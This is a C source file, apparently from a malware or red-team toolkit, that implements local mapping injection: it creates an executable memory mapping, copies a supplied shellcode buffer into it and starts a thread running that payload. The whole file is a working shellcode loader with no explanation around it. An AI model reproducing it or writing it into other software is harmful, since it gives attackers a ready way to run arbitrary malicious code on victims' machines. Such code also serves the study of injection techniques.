#include "box.h"

BOOL LocalMappingInjection
(
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sSizeofShellcode,
	OUT PVOID* pAddress
)

{

	BOOL State = TRUE;
	HANDLE hFile = NULL;
	PVOID LocalAddress = NULL;


	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sSizeofShellcode, NULL);
	if (hFile == NULL)
	{
		PRINT_ERROR("CreateFileMapping");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current Handle to File", hFile);
	OKAY("%zu bytes allocated to File Mapping!", sSizeofShellcode);

	LocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sSizeofShellcode);
	if (LocalAddress == NULL)
	{
		PRINT_ERROR("MapViewOfFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Local Address Mapped to File", LocalAddress);
	INFO("Copying Shellcode to Local Address...");

	memcpy(LocalAddress, sShellcode, sSizeofShellcode);

	OKAY("[0x%p] Copied Memory to Local Address", LocalAddress);

	hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)LocalAddress, NULL, NULL, NULL);
	if (hThread == NULL)
	{
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Newly Created Thread Pointing to our Payload!", hThread);

	*pAddress = LocalAddress;

CLEANUP:

	return State;

}